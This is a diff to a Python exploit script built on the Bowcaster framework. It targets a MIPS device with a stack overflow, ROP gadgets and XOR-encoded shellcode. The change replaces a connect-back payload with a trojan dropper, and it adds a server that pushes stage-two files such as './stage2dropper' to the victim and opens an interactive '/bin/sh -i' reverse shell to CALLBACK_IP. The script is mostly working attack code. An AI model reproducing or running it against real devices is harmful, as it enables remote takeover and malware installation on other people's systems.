@@ -19,8 +19,8 @@ import time
 
 from bowcaster.overflow_development.overflowbuilder import *
 from bowcaster.common.support import LittleEndian,Logging
-from bowcaster.servers.connectback_server import ConnectbackServer
-from bowcaster.payloads.mips.connectback_payload import ConnectbackPayload
+from bowcaster.servers.connectback_server import TrojanServer
+from bowcaster.payloads.mips import TrojanDropper
 from bowcaster.encoders.mips import *
 
 
@@ -66,20 +66,14 @@ SC.gadget_section(688,0x427a4,description="stackfinder.")
 #stackjumber. jalr $s0
 SC.gadget_section(644,0x1ffbc,description="[$s0] stackjumper")
 
-connectback_server=ConnectbackServer(CALLBACK_IP,startcmd="/bin/sh -i")
-
-#Or non-interactive exploitation:
-#connectback_server=ConnectbackServer(CALLBACK_IP,startcmd="/usr/sbin/telnetd -p 31337",connectback_shell=False)
-
-payload=ConnectbackPayload(CALLBACK_IP,LittleEndian)
+payload=TrojanDropper(CALLBACK_IP,LittleEndian)
 
 try:
     encoded_payload=MipsXorEncoder(payload,LittleEndian,key=0xecb9dcb4,badchars=badchars)
 except EncoderException as ee:
     print ee
     sys.exit(1)
-    
-#encoded_payload=MipsUpperAlphaEncoder(payload,LittleEndian,badchars=badchars)
+
 SC.string_section(700,encoded_payload.shellcode,
             description="encoded connect back payload")
 
@@ -103,7 +97,9 @@ addr=sys.argv[1]
 port=int(sys.argv[2])
 pid=1
 
-pid=connectback_server.serve()
+files_to_serve=["./stage2dropper","./helloworld"]
+server=TrojanServer(CALLBACK_IP,files_to_serve,connectback_shell=True,startcmd="/bin/sh -i")
+pid=server.serve()
 time.sleep(1)
 if pid:
     try:
@@ -114,11 +110,11 @@ if pid:
         logger.LOG_INFO("sending exploit.")
         sock.send(str(buf))
         sock.close()
-        connectback_server.wait()
+        server.wait()
     except Exception as e:
         logger.LOG_WARN("Failed to connect. ")
         logger.LOG_WARN("Failed to connect. Killing connect-back server.")
-        connectback_server.shutdown()
+        server.shutdown()
 else:
     logger.LOG_WARN("Failed to start connect-back server.")
     sys.exit(1)
